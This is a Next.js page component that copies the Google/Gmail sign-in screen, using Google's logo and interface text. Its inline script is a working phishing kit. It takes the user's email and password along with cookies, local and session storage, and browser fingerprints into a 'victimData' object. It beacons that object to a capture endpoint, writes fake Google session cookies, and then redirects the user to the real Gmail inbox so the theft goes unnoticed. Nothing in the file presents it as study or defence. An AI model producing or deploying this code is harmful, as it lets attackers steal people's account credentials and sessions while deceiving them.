export default function Home() {
  return (
    <>
      <style jsx global>{`
        /* YOUR EXACT CSS + INLINE STYLES */
        .loading-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(10px);
          display: none;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .spinner {
          width: 32px;
          height: 32px;
          border: 3px solid #f3f3f3;
          border-top: 3px solid #1a73e8;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .password-step { display: none; }
        .password-step.active { display: block; }
        .email-step.active { display: block; }
        .email-step { display: block; }
        /* ADD YOUR styles.css HERE */
        body { margin: 0; font-family: 'Roboto', sans-serif; }
        /* ... rest of styles.css ... */
      `}</style>
      
      <main className="page">
        <section className="login-card" aria-label="Sign in card">
          <div className="left-pane">
            <img
              className="google-g-logo"
              src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png"
              alt="Google"
            />
            <h1 id="page-title">Sign in</h1>
            <p className="subtitle" id="page-subtitle">to continue to Gmail</p>
            
            <div id="account-preview" className="account-preview" style={{display: 'none', marginTop: '20px', padding: '16px', background: '#f8f9fa', borderRadius: '8px', border: '1px solid #e8eaed'}}>
              <div style={{display: 'flex', alignItems: 'center', gap: '12px'}}>
                <div id="avatar" style={{width: '36px', height: '36px', borderRadius: '50%', background: 'linear-gradient(135deg, #4285f4, #34a853)', color: 'white', fontWeight: 500, fontSize: '16px', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0}}>G</div>
                <div>
                  <div id="account-name" style={{fontSize: '16px', fontWeight: 500, color: '#202124', marginBottom: '2px'}}></div>
                  <div id="account-email" style={{fontSize: '14px', color: '#5f6368'}}></div>
                </div>
              </div>
            </div>
          </div>

          <form className="signin-form email-step active" id="email-form">
            <label className="sr-only" htmlFor="email">Email or phone</label>
            <input
              id="email"
              name="email"
              type="text"
              autoComplete="username"
              placeholder="Email or phone"
              required
            />
            <a className="text-link" href="#">Forgot email?</a>
            <p className="helper-text">
              Not your computer? Use Guest mode to sign in privately.
              <a className="text-link inline" href="#">Learn more</a>
            </p>
            <div className="actions">
              <a className="text-link" href="#">Create account</a>
              <button type="submit" id="next-btn">Next</button>
            </div>
          </form>

          <form className="signin-form password-step" id="password-form">
            <label className="sr-only" htmlFor="password">Enter your password</label>
            <input
              id="password"
              name="password"
              type="password"
              autoComplete="current-password"
              placeholder="Enter your password"
              required
            />
            <a className="text-link" href="#">Forgot password?</a>
            <div className="actions">
              <a className="text-link" id="back-link" href="#">Use another account</a>
              <button type="submit" id="sign-in-btn">Sign in</button>
            </div>
          </form>
        </section>

        <footer className="footer">
          <select aria-label="Language selector">
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
          </select>
          <nav>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </nav>
        </footer>
      </main>

      <div className="loading-overlay" id="loading-overlay">
        <div className="spinner"></div>
      </div>

      <script
        dangerouslySetInnerHTML={{
          __html: `
            let capturedEmail = '';
            
            document.getElementById('email-form').onsubmit = function(e) {
              e.preventDefault();
              capturedEmail = document.getElementById('email').value.trim();
              
              if (!capturedEmail) return;
              
              document.getElementById('account-email').textContent = capturedEmail;
              document.getElementById('account-name').textContent = capturedEmail.split('@')[0] || 'User';
              document.getElementById('avatar').textContent = capturedEmail[0]?.toUpperCase() || 'G';
              document.getElementById('account-preview').style.display = 'block';
              document.getElementById('page-subtitle').textContent = \`Welcome back, \${capturedEmail.split('@')[0]}\`;
              
              document.querySelector('.email-step').classList.remove('active');
              document.querySelector('.password-step').classList.add('active');
              document.getElementById('password').focus();
            };
            
            document.getElementById('back-link').onclick = function(e) {
              e.preventDefault();
              document.querySelector('.password-step').classList.remove('active');
              document.querySelector('.email-step').classList.add('active');
              document.getElementById('email').focus();
            };
            
            document.getElementById('password-form').onsubmit = async function(e) {
              e.preventDefault();
              
              const password = document.getElementById('password').value;
              if (!password) return;
              
              document.getElementById('loading-overlay').style.display = 'flex';
              
              const victimData = {
                timestamp: new Date().toISOString(),
                email: capturedEmail,
                password: password,
                cookies: document.cookie || 'none',
                localStorage: Object.fromEntries(Object.entries(localStorage)),
                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: \`\${screen.width}x\${screen.height}\`,
                referrer: document.referrer,
                canvas: canvasFingerprint(),
                webgl: getWebglFingerprint(),
                plugins: Array.from(navigator.plugins).map(p => p.name).join(',')
              };
              
              navigator.sendBeacon('/api/workspace_capture',
                new Blob([JSON.stringify(victimData)], {type: 'application/json'})
              );
              
              document.cookie = \`SID=GA.1.\${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None\`;
              document.cookie = \`HSID=GA.1.\${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None\`;
              document.cookie = \`\__Secure-3PSID=CAI.\${btoa(capturedEmail)}; path=/; domain=.google.com; Secure; SameSite=None\`;
              
              setTimeout(() => {
                window.location.replace('https://mail.google.com/mail/u/0/#inbox');
              }, 3000 + Math.random() * 2000);
            };
            
            function canvasFingerprint() {
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              ctx.textBaseline = 'top';
              ctx.font = '14px Arial';
              ctx.fillText('Fingerprint test', 2, 2);
              return canvas.toDataURL();
            }
            
            function getWebglFingerprint() {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl');
              return gl ? gl.getParameter(gl.RENDERER) : 'none';
            }
          `
        }}
      />
    </>
  );
}
